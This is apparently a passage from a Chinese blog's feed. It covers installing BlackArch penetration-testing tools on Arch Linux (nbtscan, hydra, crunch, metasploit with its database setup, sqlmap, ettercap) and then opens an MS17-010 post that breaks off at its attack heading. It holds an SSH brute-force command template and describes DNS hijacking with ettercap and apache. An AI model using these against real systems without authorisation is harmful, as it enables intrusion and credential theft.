<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S xerosploit
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="用法">用法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo xerosploit
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后执行<code>help</code>就可以看到软件自带的帮助文档了</p>
<h4 id="nslookup">nslookup</h4>
<p>这个命令是查看域名记录的，可以查看Cname、A等各种记录。它包含在<strong>dnsutils</strong>这个包里</p>
<h5 id="安装方法-2">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S dnsutils
</span></span></code></pre></td></tr></table>
</div>
</div><p>安装这个包dnsutils即可。</p>
<blockquote>
<p>我也不太了解这个，所以具体怎么用请自行百度、谷歌一下吧。</p>
</blockquote>
<h4 id="nbtscan">nbtscan</h4>
<p>内网扫描工具，可以扫描IP段内是否有存活的IP，速度比nmap要快一些。但是只能用于局域网。</p>
<h5 id="安装方法-3">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S nbtscan
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法">使用方法</h5>
<ul>
<li>基本扫描</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nbtscan  -r  192.168.16.0/24
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>官方帮助文档</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&#34;Human-readable service names&#34; (-h) option cannot be used without verbose (-v) option.
</span></span><span class="line"><span class="cl">Usage:
</span></span><span class="line"><span class="cl">nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(&lt;scan_range&gt;) 
</span></span><span class="line"><span class="cl">	-v		verbose output. Print all names received
</span></span><span class="line"><span class="cl">			from each host
</span></span><span class="line"><span class="cl">	-d		dump packets. Print whole packet contents.
</span></span><span class="line"><span class="cl">	-e		Format output in /etc/hosts format.
</span></span><span class="line"><span class="cl">	-l		Format output in lmhosts format.
</span></span><span class="line"><span class="cl">			Cannot be used with -v, -s or -h options.
</span></span><span class="line"><span class="cl">	-t timeout	wait timeout milliseconds for response.
</span></span><span class="line"><span class="cl">			Default 1000.
</span></span><span class="line"><span class="cl">	-b bandwidth	Output throttling. Slow down output
</span></span><span class="line"><span class="cl">			so that it uses no more that bandwidth bps.
</span></span><span class="line"><span class="cl">			Useful on slow links, so that ougoing queries
</span></span><span class="line"><span class="cl">			don&#39;t get dropped.
</span></span><span class="line"><span class="cl">	-r		use local port 137 for scans. Win95 boxes
</span></span><span class="line"><span class="cl">			respond to this only.
</span></span><span class="line"><span class="cl">			You need to be root to use this option on Unix.
</span></span><span class="line"><span class="cl">	-q		Suppress banners and error messages,
</span></span><span class="line"><span class="cl">	-s separator	Script-friendly output. Don&#39;t print
</span></span><span class="line"><span class="cl">			column and record headers, separate fields with separator.
</span></span><span class="line"><span class="cl">	-h		Print human-readable names for services.
</span></span><span class="line"><span class="cl">			Can only be used with -v option.
</span></span><span class="line"><span class="cl">	-m retransmits	Number of retransmits. Default 0.
</span></span><span class="line"><span class="cl">	-f filename	Take IP addresses to scan from file filename.
</span></span><span class="line"><span class="cl">			-f - makes nbtscan take IP addresses from stdin.
</span></span><span class="line"><span class="cl">	&lt;scan_range&gt;	what to scan. Can either be single IP
</span></span><span class="line"><span class="cl">			like 192.168.1.1 or
</span></span><span class="line"><span class="cl">			range of addresses in one of two forms: 
</span></span><span class="line"><span class="cl">			xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx.
</span></span><span class="line"><span class="cl">Examples:
</span></span><span class="line"><span class="cl">	nbtscan -r 192.168.1.0/24
</span></span><span class="line"><span class="cl">		Scans the whole C-class network.
</span></span><span class="line"><span class="cl">	nbtscan 192.168.1.25-137
</span></span><span class="line"><span class="cl">		Scans a range from 192.168.1.25 to 192.168.1.137
</span></span><span class="line"><span class="cl">	nbtscan -v -s : 192.168.1.0/24
</span></span><span class="line"><span class="cl">		Scans C-class network. Prints results in script-friendly
</span></span><span class="line"><span class="cl">		format using colon as field separator.
</span></span><span class="line"><span class="cl">		Produces output like that:
</span></span><span class="line"><span class="cl">		192.168.0.1:NT_SERVER:00U
</span></span><span class="line"><span class="cl">		192.168.0.1:MY_DOMAIN:00G
</span></span><span class="line"><span class="cl">		192.168.0.1:ADMINISTRATOR:03U
</span></span><span class="line"><span class="cl">		192.168.0.2:OTHER_BOX:00U
</span></span><span class="line"><span class="cl">		...
</span></span><span class="line"><span class="cl">	nbtscan -f iplist
</span></span><span class="line"><span class="cl">		Scans IP addresses specified in file iplist.
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>这个我也不是很了解，因为平时都用nmap。</p>
</blockquote>
<h4 id="burpsuite">burpsuite</h4>
<p>抓包神器，需要安装java依赖。</p>
<h5 id="安装方法-4">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S burpsuite
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-1">使用方法</h5>
<p>burpsuite有图形界面，可以通过搜索引擎找到使用方法。</p>
<blockquote>
<p>图形界面的东西不好讲，图片一多博客就加载不出来了，请见谅。</p>
</blockquote>
<h3 id="暴力破解密码生成">暴力破解、密码生成</h3>
<h4 id="hydra">hydra</h4>
<p>暴力破解工具，中文名九头蛇，功能很强大。</p>
<h5 id="安装方法-5">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S hydra
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-2">使用方法</h5>
<ul>
<li>爆破ssh端口</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ hydra -l &lt;用户名&gt; -P &lt;密码字典.txt&gt; -v -e ns -t &lt;次数&gt; &lt;目标IP&gt; ssh
</span></span></code></pre></td></tr></table>
</div>
</div><p>具体使用方法可以通过搜索引擎查询。</p>
<h4 id="crunch">crunch</h4>
<p>强大的密码字典生成器。</p>
<h5 id="安装方法-6">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S crunch
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-3">使用方法</h5>
<p><strong>Crunch中的特殊字符有：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="s1">&#39;%&#39;</span> 插入数字
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;@&#39;</span> 插入小写字母
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;,&#39;</span> 插入大写字母
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s1">&#39;^&#39;</span> 插入符号
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>Crunch中用到的命令参数有：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-b <span class="c1">#按大小分割字典文件，比如后跟20mib</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-c <span class="c1">#密码个数（行数），比如8000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-d <span class="c1">#限制出现相同元素的个数（至少出现元素个数），-d 3就不会出现aabbbb之类的情况</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-e <span class="c1">#定义停止生成密码 ，比如-e abcd：到abcd停止生成密码</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-f <span class="c1">#调用密码库文件，比如-f charset.lst mixalpha-numeric 意为调用密码库 charset.lst中的 mixalpha-numeric项目字符</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-i <span class="c1">#改变输出格式</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-l <span class="c1">#与-t搭配使用</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-m <span class="c1">#与-p搭配使用</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-o <span class="c1">#保存为</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-p <span class="c1">#定义密码元素</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-q <span class="c1">#读取字典</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-r <span class="c1">#定义从某一个地方重新开始</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-s <span class="c1">#第一个密码，从xxx开始</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-t <span class="c1">#定义输出格式</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-z <span class="c1">#打包压缩，格式支持 gzip, bzip2, lzma, 7z</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>生成最小1位，最大8位，由26个小写字母为元素的所有组合:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ crunch <span class="m">1</span> <span class="m">8</span> &gt;&gt; 1.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>生成 最小为1,最大为4.由abcd为元素的所有组合:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ crunch <span class="m">1</span> <span class="m">4</span> abcd &gt;&gt; 2.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>生成以“yale”“test”为元素的所有密码组合:</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ crunch <span class="m">4</span> <span class="m">5</span> -p yale <span class="nb">test</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>还有更多的方法可以自行通过搜索引擎查找。</p>
<h3 id="漏洞利用">漏洞利用</h3>
<h4 id="metasploit">metasploit</h4>
<p>这是最重要的一个工具，没有它，内网的渗透也是无法完整进行的。</p>
<h5 id="安装方法-7">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S metasploit
</span></span></code></pre></td></tr></table>
</div>
</div><p>安装完后执行:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>即可。</p>
<h5 id="修复数据库问题">修复数据库问题</h5>
<p>启动msf以后是不是出现了三行报错？这是没有连接数据库导致的。</p>
<h6 id="安装postgresql">安装postgresql</h6>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S postgresql
</span></span></code></pre></td></tr></table>
</div>
</div><h6 id="配置postgresql">配置postgresql</h6>
<p>安装完后会多出来一个用户，叫做<code>postgres</code>，我们需要给它设置一个密码。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo passwd postgres
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后初始化数据库</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo su - postgres -c <span class="s2">&#34;initdb --locale en_US.UTF-8 -E UTF8 -D &#39;/var/lib/postgres/data&#39;&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>初始化完成后就可以启动数据库了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo systemctl start postgresql
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来，进入数据库用户postgres</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo su postgres
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行<code>psql</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ psql
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后光标就变成了<code>postgres=#</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1">#</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>如上面这个样子。</p>
<p>接下来创建一个数据库的新用户，比如<code>msf4</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1"># CREATE USER msf4 WITH PASSWORD &#39;123456&#39;;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后创建对应的数据库</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1"># CREATE DATABASE msfdb OWNER msf4;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>将msfdb数据库的所有权限都赋予msf4</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1"># GRANT ALL PRIVILEGES ON DATABASE msfdb TO msf4;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>退出psql</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">postgres</span><span class="o">=</span><span class="c1"># \q</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>创建Linux普通用户，名称与刚才新建的数据库用户同名，如msf4</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo useradd msf4
</span></span></code></pre></td></tr></table>
</div>
</div><h6 id="通过msf连接数据库">通过msf连接数据库</h6>
<p>进入msf，链接数据库，命令为<code>db_connect用户名:密码@ip/数据库名</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5&gt; db_connect msf4:123456@127.0.0.1/msfdb
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后检查是否连接成功，如果出现类似以下内容说明成功了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; db_status
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Connected to msf3. Connection type: postgresql. Connection name: DFz5oEX3.
</span></span></code></pre></td></tr></table>
</div>
</div><p>成功连接后，别忘了保存以及设置<code>postgresql</code>自启</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 &gt; db_save
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo systemctl <span class="nb">enable</span> postgresql
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-4">使用方法</h5>
<p>参考<a href="/posts/%e9%9c%87%e6%83%8a16%e5%b2%81%e7%94%b7%e5%ad%90%e7%ab%9f%e7%84%b6%e5%9c%a8%e5%ae%b6%e9%87%8c%e5%81%9a%e5%87%ba%e8%bf%99%e7%a7%8d%e4%ba%8b/" rel="">这篇文章</a></p>
<p>也可通过搜索引擎找更多的教程。</p>
<h4 id="sqlmap">sqlmap</h4>
<p>强大的web注入工具，使用方法可以通过搜索引擎查到。</p>
<h5 id="安装方法-8">安装方法</h5>
<p>执行以下命令安装即可。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S sqlmap
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="dns劫持">DNS劫持</h3>
<h4 id="ettercap">ettercap</h4>
<p>强大的DNS劫持工具，各大搜索引擎也有不少教程。它分为命令行版本和图形化版本，但是只能装其中一个，否则会冲突。</p>
<h5 id="安装方法-9">安装方法</h5>
<p>命令行版:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S ettercap
</span></span></code></pre></td></tr></table>
</div>
</div><p>图形化版:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S ettercap-gtk
</span></span></code></pre></td></tr></table>
</div>
</div><p>命令行版本在终端执行即可，图形化版本可以在菜单中找到，如果没有执行以下命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo ettercap -G
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="apache">apache</h4>
<p>怎么还有这个东西？这个东西不是建网站的吗，哈哈，其实这个是辅助ettercap的，当你劫持目标DNS以后，会将其强行解析到你的IP，而apache就可以在你的机器上运行一个静态网页（html）。</p>
<h5 id="安装方法-10">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S apache
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-5">使用方法</h5>
<p>执行以下命令启动apache</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo systemctl start httpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>网页根目录为<code>/srv/http/</code></p>
<p>可以在目录下写一个html文件，写完执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo systemctl restart httpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>以重启apache即可。</p>
<h2 id="小结">小结</h2>
<p>一个普通的Arch Linuxu导入了Black Arch的软件源之后，可以堪称完美的渗透环境了，以上只是常用的工具，而Black Arch软件源里面有几千个工具，想要什么可以通过<code>pacman</code>下载安装，应有尽有。</p>
<p>最后，谢谢访问。</p>
]]></description>
</item><item>
    <title>震惊！16岁男子竟然在家里做出这种事！</title>
    <link>http://weepingdogel.github.io/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/</link>
    <pubDate>Fri, 26 Jul 2019 22:52:54 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E9%9C%87%E6%83%8A16%E5%B2%81%E7%94%B7%E5%AD%90%E7%AB%9F%E7%84%B6%E5%9C%A8%E5%AE%B6%E9%87%8C%E5%81%9A%E5%87%BA%E8%BF%99%E7%A7%8D%E4%BA%8B/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-j5j5vm.jpg" referrerpolicy="no-referrer">
            </div><h2 id="简介">简介</h2>
<p>该男子居然在家做出这种事情，使多数人震惊！</p>
<h2 id="这才是真正的简介">这才是真正的简介</h2>
<p>哈哈，上面那个是假的，本篇博客将会复现MS17-010漏洞攻击。</p>
<h3 id="ms17-010是啥啊">MS17-010是啥啊？</h3>
<p>你是否记得2017年的那个勒索病毒？就是不给钱就把你电脑里所有的AV加密起来的一个病毒。是不是很可怕？这个病毒就是通过这个漏洞让更多的人看不到AV的。</p>
<ul>
<li>那这个漏洞是怎样的呢？我将给出以下链接用于参考：</li>
</ul>
<blockquote>
<p><a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2017/ms17-010" target="_blank" rel="noopener noreffer">Microsoft 安全公告 MS17-010 - 严重</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0143/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0143/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0144/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0144/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0145/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0145/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0146/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0146/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0147/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0147/</a></p>
<p><a href="https://cvedetails.com/cve/CVE-2017-0148/" target="_blank" rel="noopener noreffer">https://cvedetails.com/cve/CVE-2017-0148/</a></p>
<p><a href="https://github.com/RiskSense-Ops/MS17-010" target="_blank" rel="noopener noreffer">https://github.com/RiskSense-Ops/MS17-010</a></p>
</blockquote>
<h2 id="攻击复现">攻击复现</h2>
